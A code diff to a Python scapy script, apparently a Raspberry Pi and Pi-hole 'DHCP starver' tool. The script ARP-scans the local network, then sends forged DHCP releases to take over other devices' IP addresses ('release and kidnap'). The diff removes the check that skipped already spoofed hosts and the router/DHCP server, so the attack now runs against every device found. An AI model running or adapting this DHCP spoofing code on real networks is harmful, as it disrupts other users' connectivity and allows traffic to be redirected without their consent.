@@ -10,6 +10,7 @@ import scapy.all as scapy
 import json
 import threading
 import subprocess
+from pathlib import Path
 from common import *
 from utils import setup_logging, write_to_log, file_semaphore
 
@@ -17,8 +18,10 @@ from utils import setup_logging, write_to_log, file_semaphore
 #### CONFIG #### -------------------------------------------------------------------
 timeout_to_receive_arp_reply = 5 # Time to wait to receive ARP Reply (seconds)
 timeout_to_receive_dhcp_response = 30 # seconds
-time_to_wait_between_release_and_discover = 5 # seconds
-log_file = "/home/pi/dhcp_starver/logs/dhcp_spoof.log"
+time_to_wait_between_release_and_discover = 10 # seconds
+base_dir = Path(__file__).resolve().parent
+log_file = base_dir / "logs" / "dhcp_spoof.log"
+#log_file = "logs/dhcp_spoof.log"
 
 
 setup_logging(log_file)
@@ -55,11 +58,14 @@ def get_unspoofed_ips(network_ip_addresses, spoofed_ip_dict):
     try:
         # Iterating for every fake_host in the dictionary
         for ip, host in spoofed_ip_dict.items():
-            '''
-            # Check if host is spoofed or is DHCP server
-            if host.is_spoofed or host.is_server:
-            '''
-            # Check if host is spoofed or is DHCP server
+            
+            # Check if host is DHCP server
+            if host.is_server:
+                global dhcp_server_ip, dhcp_server_mac
+                dhcp_server_ip = ip
+                dhcp_server_mac = host.mac_address
+            
+            # Check if host is spoofed
             if host.is_spoofed:
                 # Remove IP address from all IP addresses list
                 network_ip_addresses.remove(ip)
@@ -199,7 +205,7 @@ def send_gratuitous_arp(host_mac, host_ip):
 def arp_scan(target_ips):
     """
     Performs a targeted ARP request scan to find existing hosts on the network.
-    Returns a list with hosts' (IP, MAC) tuples who have answered
+    Returns a list with hosts' (IP, MAC) tuples who have answered, except the router
     """
     # ARP Request packet, one for every unspoofed ip address
     arp_requests = [scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip) for ip in target_ips]
@@ -280,7 +286,7 @@ def check_if_router(ip_address):
 
 def main():
     
-    write_to_log(f"Starting DHCP spoofing proccess")
+    write_to_log(f"Starting DHCP spoofing process")
     # Get network interface assigned IP address and network network mask
     our_ip_address, _, our_netmask, _ = get_network_params(iface)
     
@@ -296,6 +302,14 @@ def main():
     # Perform an ARP scan
     ip_mac_data = arp_scan(target_ips)
 
+    # Getting Pi-hole DHCP Server's IP lease list
+    spoofed_hosts = get_dhcp_leases()
+
+    if spoofed_hosts:
+        write_to_log(f"Existing and spoofed devices:")
+        for mac, info in spoofed_hosts.items():
+            write_to_log(f"MAC: {mac}, IP: {info['ip_address']}, Hostname: {info['hostname']}")
+
     # Prints found devices on network
     if ip_mac_data:
         write_to_log(f"Found connected and unspoofed device(s):")
@@ -305,10 +319,7 @@ def main():
         write_to_log(f"No other devices found")
         write_to_log(f"Service Terminated")
         exit()
-
-    # Getting Pi-hole DHCP Server's IP lease list
-    spoofed_hosts = get_dhcp_leases()
-
+  
     # Start response DHCP packet capture thread
     capture_thread = threading.Thread(target=capture_dhcp_packets, args=(captured_packets, iface))
     capture_thread.daemon = True
@@ -316,9 +327,9 @@ def main():
 
     for ip, mac in ip_mac_data:
         # Checking if discovered host is not already spoofed nor router/DHCP Server
-        if mac not in spoofed_hosts.keys() and ip != dhcp_server_ip:
-            # Try to release that host IP address and kidnap it
-            release_and_catch(mac, ip)
+        #if mac not in spoofed_hosts.keys() and ip != dhcp_server_ip:
+        # Try to release that host IP address and kidnap it
+        release_and_catch(mac, ip)
     
     write_to_log(f"Service Terminated")
     
